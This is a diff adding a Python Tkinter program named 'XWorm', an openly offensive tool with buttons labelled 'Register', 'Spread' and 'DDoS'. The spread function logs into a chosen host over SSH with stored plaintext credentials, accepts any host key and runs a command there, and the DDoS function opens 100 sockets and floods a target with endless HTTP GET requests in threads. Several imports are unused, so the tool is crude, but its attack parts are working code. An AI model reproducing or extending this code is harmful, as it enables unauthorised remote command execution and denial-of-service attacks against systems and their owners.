@@ -1,0 +1,97 @@
+import tkinter as tk
+from tkinter import messagebox
+import json
+import paramiko
+import pysmbclient
+from cryptography.fernet import Fernet
+import socket
+import threading
+
+class XWormGUI:
+    def __init__(self):
+        self.root = tk.Tk()
+        self.root.title("XWorm")
+        self.root.geometry("400x300")
+
+        # Create GUI elements
+        self.ip_label = tk.Label(self.root, text="IP Address:")
+        self.ip_label.pack()
+        self.ip_entry = tk.Entry(self.root)
+        self.ip_entry.pack()
+
+        self.username_label = tk.Label(self.root, text="Username:")
+        self.username_label.pack()
+        self.username_entry = tk.Entry(self.root)
+        self.username_entry.pack()
+
+        self.password_label = tk.Label(self.root, text="Password:")
+        self.password_label.pack()
+        self.password_entry = tk.Entry(self.root)
+        self.password_entry.pack()
+
+        self.ddos_label = tk.Label(self.root, text="DDoS Target:")
+        self.ddos_label.pack()
+        self.ddos_entry = tk.Entry(self.root)
+        self.ddos_entry.pack()
+
+        self.register_button = tk.Button(self.root, text="Register", command=self.register)
+        self.register_button.pack()
+
+        self.spread_button = tk.Button(self.root, text="Spread", command=self.spread)
+        self.spread_button.pack()
+
+        self.ddos_button = tk.Button(self.root, text="DDoS", command=self.ddos)
+        self.ddos_button.pack()
+
+    def register(self):
+        ip = self.ip_entry.get()
+        username = self.username_entry.get()
+        password = self.password_entry.get()
+
+        # Save to JSON file
+        data = {
+            "ip": ip,
+            "username": username,
+            "password": password
+        }
+        with open("data.json", "w") as f:
+            json.dump(data, f)
+
+    def spread(self):
+        # Read JSON file
+        with open("data.json", "r") as f:
+            data = json.load(f)
+        ip = data["ip"]
+        username = data["username"]
+        password = data["password"]
+
+        # Connect to SSH server
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, username=username, password=password)
+
+        # Execute payload
+        ssh.exec_command("echo 'XWorm is here!' > /tmp/xworm.txt")
+
+    def ddos(self):
+        target = self.ddos_entry.get()
+        threads = []
+
+        # Create sockets and send requests
+        for i in range(100):
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target, 80))
+            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+            threads.append(threading.Thread(target=self.send_requests, args=(sock, target)))
+            threads[i].start()
+
+    def send_requests(self, sock, target):
+        while True:
+            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+
+    def run(self):
+        self.root.mainloop()
+
+if __name__ == "__main__":
+    gui = XWormGUI()
+    gui.run()
